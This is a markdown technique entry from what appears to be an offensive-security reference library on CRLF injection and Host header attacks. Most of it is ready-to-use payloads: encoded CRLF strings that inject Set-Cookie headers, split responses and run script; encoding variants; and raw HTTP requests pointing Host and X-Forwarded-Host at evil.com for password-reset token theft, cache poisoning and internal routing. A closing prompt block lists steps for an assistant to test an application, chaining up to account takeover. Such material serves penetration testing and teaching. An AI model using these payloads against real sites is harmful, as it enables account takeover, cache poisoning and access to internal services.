---
id: "crlf-host-header"
title: "CRLF Injection & Host Header Attacks"
type: "technique"
category: "web-application"
subcategory: "xss"
tags: ["crlf", "host-header", "header-injection", "password-reset-poisoning", "cache-poisoning", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["http-request-smuggling", "cache-poisoning", "account-takeover", "open-redirect"]
updated: "2026-03-30"
---

## Overview

CRLF injection inserts newline characters (`\r\n`) into HTTP headers, enabling header injection, response splitting, and cache poisoning. Host header attacks exploit applications that trust the Host header for link generation, password resets, and routing.

## CRLF Injection

### Header Injection
```
# Inject Set-Cookie header
/path%0d%0aSet-Cookie:%20admin=true

# Inject arbitrary response header
/path%0d%0aX-Injected:%20header-value

# Response splitting (inject full response)
/path%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

### CRLF → XSS
```
# Inject Content-Type and body
/path%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Via Location header
/redirect?url=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img/src=x%20onerror=alert(1)>
```

### CRLF → Cache Poisoning
```
# Inject headers that influence caching
/path%0d%0aX-Forwarded-Host:%20evil.com
# Cached response now uses evil.com for all asset URLs
```

### Encoding Variants
```
%0d%0a          # Standard CRLF
%0a             # LF only (works on some servers)
%0d             # CR only
%0a%20          # LF + space (header continuation)
\r\n            # Literal escape sequences
%E5%98%8A%E5%98%8D  # UTF-8 encoded CRLF
```

## Host Header Attacks

### Password Reset Poisoning
```http
POST /forgot-password HTTP/1.1
Host: evil.com

email=victim@target.com
```
If the app generates: `https://evil.com/reset?token=SECRET`

### Routing-Based SSRF
```http
GET / HTTP/1.1
Host: internal-service.local

# Reverse proxy routes based on Host header
# Reach internal services not directly accessible
```

### Web Cache Poisoning via Host
```http
GET /login HTTP/1.1
Host: evil.com

# If cached, all users see login page with evil.com links
```

### Multiple Host Headers
```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

# Some servers use first, cache keys on second (or vice versa)
```

### Absolute URL + Host Mismatch
```http
GET https://target.com/ HTTP/1.1
Host: evil.com

# Backend may prefer Host over the absolute URL
```

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Application reads X-Forwarded-Host for link generation
```

## Deep Dig Prompts

```
Given this application [describe]:
1. Test all input points for CRLF injection (%0d%0a in URL, headers, parameters).
2. Test Host header manipulation on password reset, email links, and redirect generation.
3. Try X-Forwarded-Host, X-Original-URL, X-Forwarded-Server overrides.
4. Check if CRLF enables cache poisoning by injecting response headers.
5. Test multiple Host headers and absolute URL + Host mismatch.
6. Chain: Host header poisoning → password reset token theft → account takeover.
```

## Tools

- **CRLFuzz** — Automated CRLF injection scanner
- **Burp Suite** — Manual header injection
- **crlfmap** — CRLF detection tool
